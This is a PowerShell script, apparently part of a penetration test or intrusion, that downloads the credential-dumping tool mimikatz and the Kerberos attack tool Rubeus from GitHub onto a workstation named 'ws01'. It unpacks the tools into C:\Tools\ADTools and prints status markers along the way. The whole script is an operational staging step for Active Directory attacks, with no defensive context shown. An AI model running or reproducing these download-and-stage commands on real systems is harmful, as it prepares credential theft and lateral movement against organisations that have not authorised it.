# Download latest official mimikatz + Rubeus releases to ws01 (internet is up)
$ErrorActionPreference = 'Continue'
$out = 'C:\Tools\ADTools'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Output '=== MIMIKATZ LATEST ==='
try {
    Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile "$out\mimikatz-latest.zip" -UseBasicParsing -ErrorAction Stop
    Write-Output "MIK_ZIP_SIZE $((Get-Item "$out\mimikatz-latest.zip").Length)"
    Expand-Archive "$out\mimikatz-latest.zip" "$out\mimikatz-latest" -Force
    $x64 = Get-ChildItem "$out\mimikatz-latest" -Recurse -Filter 'mimikatz.exe' | Where-Object { $_.FullName -match 'x64' } | Select-Object -First 1
    if ($x64) { Write-Output "MIK_X64 $($x64.FullName)|$($x64.Length)" }
} catch { Write-Output "MIK_DL_ERR|$($_.Exception.Message)" }

Write-Output '=== RUBEUS LATEST ==='
try {
    Invoke-WebRequest -Uri 'https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe' -OutFile "$out\Rubeus-official.exe" -UseBasicParsing -ErrorAction Stop
    Write-Output "RUBEUS_SIZE $((Get-Item "$out\Rubeus-official.exe").Length)"
} catch { Write-Output "RUBEUS_DL_ERR|$($_.Exception.Message)" }

Write-Output 'DOWNLOAD_DONE'
